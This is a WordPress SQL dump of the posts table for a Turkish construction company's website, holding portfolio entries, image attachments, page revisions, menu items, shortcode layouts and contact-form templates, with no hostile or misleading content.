INSERT INTO `cmrfu_posts` VALUES("854","1","2014-06-02 13:15:10","2014-06-02 10:15:10","","Hervenik Dubleks 6","","inherit","open","open","","177-autosave-v1","","","2014-06-02 13:15:10","2014-06-02 10:15:10","","177","http://herkonyapi.com/177-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("855","1","2014-06-02 13:15:32","2014-06-02 10:15:32","","8","","inherit","open","open","","8-2","","","2014-06-02 13:15:32","2014-06-02 10:15:32","","177","http://herkonyapi.com/wp-content/uploads/2013/10/81.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("856","1","2014-06-02 13:16:09","2014-06-02 10:16:09","","1","","inherit","open","open","","1-3","","","2014-06-02 13:16:09","2014-06-02 10:16:09","","177","http://herkonyapi.com/wp-content/uploads/2013/10/12.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("857","1","2014-06-02 13:16:10","2014-06-02 10:16:10","","2","","inherit","open","open","","2-2","","","2014-06-02 13:16:10","2014-06-02 10:16:10","","177","http://herkonyapi.com/wp-content/uploads/2013/10/21.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("858","1","2014-06-02 13:16:12","2014-06-02 10:16:12","","6","","inherit","open","open","","6-3","","","2014-06-02 13:16:12","2014-06-02 10:16:12","","177","http://herkonyapi.com/wp-content/uploads/2013/10/62.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("184","1","2013-10-11 05:02:59","2013-10-11 05:02:59","","Alpay Konak Kat 3","","publish","closed","closed","","alpay-konak-kat-3","","","2014-06-02 13:09:09","2014-06-02 10:09:09","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=184","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("848","1","2014-06-02 13:12:33","2014-06-02 10:12:33","","Hervenik Apartman Daire 4","","inherit","open","open","","182-autosave-v1","","","2014-06-02 13:12:33","2014-06-02 10:12:33","","182","http://herkonyapi.com/182-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("849","1","2014-06-02 13:13:04","2014-06-02 10:13:04","","9","","inherit","open","open","","9-3","","","2014-06-02 13:13:04","2014-06-02 10:13:04","","182","http://herkonyapi.com/wp-content/uploads/2013/10/92.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("850","1","2014-06-02 13:13:27","2014-06-02 10:13:27","","1","","inherit","open","open","","1-2","","","2014-06-02 13:13:27","2014-06-02 10:13:27","","182","http://herkonyapi.com/wp-content/uploads/2013/10/11.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("851","1","2014-06-02 13:13:29","2014-06-02 10:13:29","","5","","inherit","open","open","","5-2","","","2014-06-02 13:13:29","2014-06-02 10:13:29","","182","http://herkonyapi.com/wp-content/uploads/2013/10/51.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("852","1","2014-06-02 13:13:31","2014-06-02 10:13:31","","6","","inherit","open","open","","6-2","","","2014-06-02 13:13:31","2014-06-02 10:13:31","","182","http://herkonyapi.com/wp-content/uploads/2013/10/61.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("186","1","2013-10-11 05:06:11","2013-10-11 05:06:11","","Alpay Konak Dükkan","","publish","closed","closed","","alpay-konak-dukkan","","","2014-06-02 12:30:05","2014-06-02 09:30:05","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=186","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("834","1","2014-08-29 23:47:59","2014-08-29 20:47:59","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-autosave-v1","","","2014-08-29 23:47:59","2014-08-29 20:47:59","","524","http://herkonyapi.com/524-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("446","1","2013-10-12 01:51:27","2013-10-12 01:51:27","<p>İsim*<br />
    [text* your-name] </p>

<p>Email*<br />
    [email* your-email] </p>

<p>Konu<br />
    [text your-subject] </p>

<p>Mesajınız<br />
    [textarea your-message] </p>

<p>[submit class:button class:color \"Gönder\"]</p>
[your-subject]
info@herkonyapi.com
From: [your-name] <[your-email]>
Subject: [your-subject]

Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)
info@herkonyapi.com




[your-subject]
[your-name] <[your-email]>
Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)
[your-email]



Your message was sent successfully. Thanks.
Failed to send your message. Please try later or contact the administrator by another method.
Validation errors occurred. Please confirm the fields and submit it again.
Failed to send your message. Please try later or contact the administrator by another method.
Please accept the terms to proceed.
Please fill the required field.
Your entered code is incorrect.
Date format seems invalid.
This date is too early.
This date is too late.
Failed to upload file.
This file type is not allowed.
This file is too large.
Failed to upload file. Error occurred.
Number format seems invalid.
This number is too small.
This number is too large.
Your answer is not correct.
Email address seems invalid.
URL seems invalid.
Telephone number seems invalid.","Contact form 1","","publish","open","open","","contact-form-1","","","2014-02-20 09:25:55","2014-02-20 07:25:55","","0","http://localhost/leaf/wordpress/?post_type=wpcf7_contact_form&#038;p=446","0","wpcf7_contact_form","","0");
INSERT INTO `cmrfu_posts` VALUES("449","1","2013-10-12 02:33:54","2013-10-12 02:33:54","<div class=\"cols\">
<div class=\"col-4\">
<p>Your Name (required)<br />
    [text* your-name] </p>

<p>Your Email (required)<br />
    [email* your-email] </p>

<p>Subject<br />
    [text your-subject] </p>
</div>
<div class=\"col-4\">
<p>Your Message<br />
    [textarea your-message] </p>

<p>[submit class:button class:color \"Send\"]</p>
</div>
</div>
[your-subject]
[your-name] <[your-email]>
From: [your-name] <[your-email]>
Subject: [your-subject]

Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)
hoathuancntt@gmail.com




[your-subject]
[your-name] <[your-email]>
Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)
[your-email]



Your message was sent successfully. Thanks.
Failed to send your message. Please try later or contact the administrator by another method.
Validation errors occurred. Please confirm the fields and submit it again.
Failed to send your message. Please try later or contact the administrator by another method.
Please accept the terms to proceed.
Please fill the required field.
Your entered code is incorrect.
Date format seems invalid.
This date is too early.
This date is too late.
Failed to upload file.
This file type is not allowed.
This file is too large.
Failed to upload file. Error occurred.
Number format seems invalid.
This number is too small.
This number is too large.
Your answer is not correct.
Email address seems invalid.
URL seems invalid.
Telephone number seems invalid.","Quick Contact","","publish","open","open","","quick-contact","","","2013-10-12 02:33:54","2013-10-12 02:33:54","","0","http://localhost/leaf/wordpress/?post_type=wpcf7_contact_form&amp;p=449","0","wpcf7_contact_form","","0");
INSERT INTO `cmrfu_posts` VALUES("710","1","2014-02-19 19:38:52","2014-02-19 17:38:52"," ","","","publish","open","open","","710","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/710/","1","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("926","1","2014-06-02 14:32:37","2014-06-02 11:32:37","","slide2","","inherit","open","open","","slide2","","","2014-06-02 14:32:37","2014-06-02 11:32:37","","0","http://herkonyapi.com/wp-content/uploads/2014/06/slide2.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("952","1","2014-08-29 22:55:18","2014-08-29 19:55:18","","canakkale_seramik","","inherit","open","open","","canakkale_seramik","","","2014-08-29 22:55:18","2014-08-29 19:55:18","","946","http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("951","1","2014-08-29 22:55:17","2014-08-29 19:55:17","","baykaralar","","inherit","open","open","","baykaralar","","","2014-08-29 22:55:17","2014-08-29 19:55:17","","946","http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("715","1","2014-02-19 19:38:53","2014-02-19 17:38:53"," ","","","publish","open","open","","715","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/715/","9","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("716","1","2014-02-19 19:38:53","2014-02-19 17:38:53"," ","","","publish","open","open","","716","","","2014-06-02 13:59:46","2014-06-02 10:59:46","","0","http://herkonyapi.com/716/","2","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("717","1","2014-02-19 19:38:53","2014-02-19 17:38:53"," ","","","publish","open","open","","717","","","2014-06-02 13:59:46","2014-06-02 10:59:46","","0","http://herkonyapi.com/717/","3","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("916","1","2014-06-02 14:01:09","2014-06-02 11:01:09","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Refik Osman Top Sokak Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-06-02 14:01:09","2014-06-02 11:01:09","","524","http://herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("925","1","2014-06-02 14:25:06","2014-06-02 11:25:06","Herkon yapı web sitesi yayın hayatına başlamıştır.","Herkon Yapı","","inherit","open","open","","924-revision-v1","","","2014-06-02 14:25:06","2014-06-02 11:25:06","","924","http://herkonyapi.com/924-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("924","1","2014-06-02 14:25:06","2014-06-02 11:25:06","Herkon yapı web sitesi yayın hayatına başlamıştır.","Herkon Yapı","","publish","open","open","","herkon-yapi","","","2014-06-02 14:25:06","2014-06-02 11:25:06","","0","http://herkonyapi.com/?p=924","0","post","","0");
INSERT INTO `cmrfu_posts` VALUES("915","1","2014-06-02 13:59:46","2014-06-02 10:59:46"," ","","","publish","open","open","","915","","","2014-06-02 13:59:46","2014-06-02 10:59:46","","0","http://herkonyapi.com/?p=915","1","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("923","1","2014-06-02 14:23:20","2014-06-02 11:23:20","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Refik Osman Top Sok. Maçka İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 222 10 10[/list_item]
[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-06-02 14:23:20","2014-06-02 11:23:20","","447","http://herkonyapi.com/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("921","1","2014-06-02 14:14:49","2014-06-02 11:14:49"," ","","","publish","open","open","","921","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/?p=921","5","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("919","1","2014-06-02 14:10:29","2014-06-02 11:10:29","","Projeler","","inherit","open","open","","918-revision-v1","","","2014-06-02 14:10:29","2014-06-02 11:10:29","","918","http://herkonyapi.com/918-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("918","1","2014-06-02 14:10:29","2014-06-02 11:10:29","","Projeler","","publish","open","open","","projeler","","","2014-06-02 14:10:29","2014-06-02 11:10:29","","0","http://herkonyapi.com/?page_id=918","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("748","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","748","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/748/","1","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("749","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","749","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/749/","4","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("750","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","750","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/750/","2","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("751","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","751","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/751/","3","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("922","1","2014-06-02 14:15:14","2014-06-02 11:15:14","","Duyurular","","inherit","open","open","","454-revision-v1","","","2014-06-02 14:15:14","2014-06-02 11:15:14","","454","http://herkonyapi.com/454-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("759","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","759","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/759/","1","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("760","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","760","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/760/","2","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("761","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","761","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/761/","3","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("762","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","762","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/762/","6","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("763","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","763","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/763/","7","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("764","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","764","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://herkonyapi.com/764/","8","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("765","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","765","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/765/","10","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("766","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","766","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/766/","11","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("767","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","767","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/767/","12","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("768","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","768","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/768/","13","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("769","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","769","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/769/","14","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("770","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","770","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/770/","15","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("771","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","771","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/771/","16","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("772","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","772","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/772/","17","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("773","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","773","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/773/","18","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("774","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","774","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/774/","19","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("775","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","775","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/775/","20","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("776","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","776","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://herkonyapi.com/776/","21","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("777","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","777","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/777/","22","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("778","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","778","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/778/","23","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("779","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","779","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/779/","24","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("780","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","780","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/780/","25","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("781","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","781","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/781/","26","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("782","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","782","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/782/","27","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("783","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","783","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/783/","28","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("784","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","784","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/784/","29","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("785","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","785","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://herkonyapi.com/785/","30","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("786","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","786","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/786/","32","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("787","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","787","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/787/","33","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("788","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","788","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/788/","34","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("789","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","789","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","671","http://herkonyapi.com/789/","35","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("790","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","790","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","671","http://herkonyapi.com/790/","36","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("791","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","791","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","671","http://herkonyapi.com/791/","37","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("792","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","792","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/792/","39","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("793","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","793","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/793/","40","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("794","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","794","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/794/","41","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("795","1","2014-02-19 19:38:55","2014-02-19 17:38:55","","Filter 3 Columns","","publish","open","open","","filter-3-columns-2","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/filter-3-columns-2/","42","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("796","1","2014-02-19 19:38:55","2014-02-19 17:38:55","","Filter 2 Columns","","publish","open","open","","filter-2-columns-2","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/filter-2-columns-2/","43","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("797","1","2014-02-19 19:38:55","2014-02-19 17:38:55","","Portfolio Detail","","publish","open","open","","portfolio-detail-2","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/portfolio-detail-2/","44","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("798","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","798","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://herkonyapi.com/798/","45","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("799","1","2014-02-19 19:38:56","2014-02-19 17:38:56","","Blog Single","","publish","open","open","","blog-single-2","","","2014-02-19 19:38:56","2014-02-19 17:38:56","","0","http://herkonyapi.com/blog-single-2/","48","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("800","1","2014-02-19 19:38:56","2014-02-19 17:38:56"," ","","","publish","open","open","","800","","","2014-02-19 19:38:56","2014-02-19 17:38:56","","0","http://herkonyapi.com/800/","49","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("801","1","2014-02-19 19:38:56","2014-02-19 17:38:56"," ","","","publish","open","open","","801","","","2014-02-19 19:38:56","2014-02-19 17:38:56","","0","http://herkonyapi.com/801/","4","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("805","1","2014-02-19 20:56:05","2014-02-19 18:56:05","","bright_squares","","inherit","open","open","","bright_squares","","","2014-02-19 20:56:05","2014-02-19 18:56:05","","0","http://herkonyapi.com/wp-content/uploads/2014/02/bright_squares.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("817","1","2014-02-19 22:17:13","2014-02-19 20:17:13","","nophoto","","inherit","open","open","","nophoto","","","2014-02-19 22:17:13","2014-02-19 20:17:13","","186","http://herkonyapi.com/wp-content/uploads/2013/10/nophoto.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("818","1","2014-08-29 22:25:33","2014-08-29 19:25:33","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Nüshetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 261 61 50 - 52[/list_item]

[list_item icon=\"phone-sign\"]+90 212 261 61 50 - 52[/list_item]
[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-autosave-v1","","","2014-08-29 22:25:33","2014-08-29 19:25:33","","447","http://herkonyapi.com/447-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("821","1","2014-06-02 12:16:09","2014-06-02 09:16:09","","herkon--logo","","inherit","open","open","","herkon-logo","","","2014-06-02 12:16:09","2014-06-02 09:16:09","","0","http://herkonyapi.com/wp-content/uploads/2014/06/herkon-logo.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("822","1","2014-06-02 12:25:37","2014-06-02 09:25:37","","Alpay Konak","","inherit","open","open","","186-autosave-v1","","","2014-06-02 12:25:37","2014-06-02 09:25:37","","186","http://herkonyapi.com/186-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("823","1","2014-06-02 12:27:53","2014-06-02 09:27:53","","9","","inherit","open","open","","9","","","2014-06-02 12:27:53","2014-06-02 09:27:53","","186","http://herkonyapi.com/wp-content/uploads/2013/10/9.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("824","1","2014-06-02 12:28:08","2014-06-02 09:28:08","","1","","inherit","open","open","","1","","","2014-06-02 12:28:08","2014-06-02 09:28:08","","186","http://herkonyapi.com/wp-content/uploads/2013/10/1.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("825","1","2014-06-02 12:28:10","2014-06-02 09:28:10","","2","","inherit","open","open","","2","","","2014-06-02 12:28:10","2014-06-02 09:28:10","","186","http://herkonyapi.com/wp-content/uploads/2013/10/2.jpg","0","attachment","image/jpeg","0");
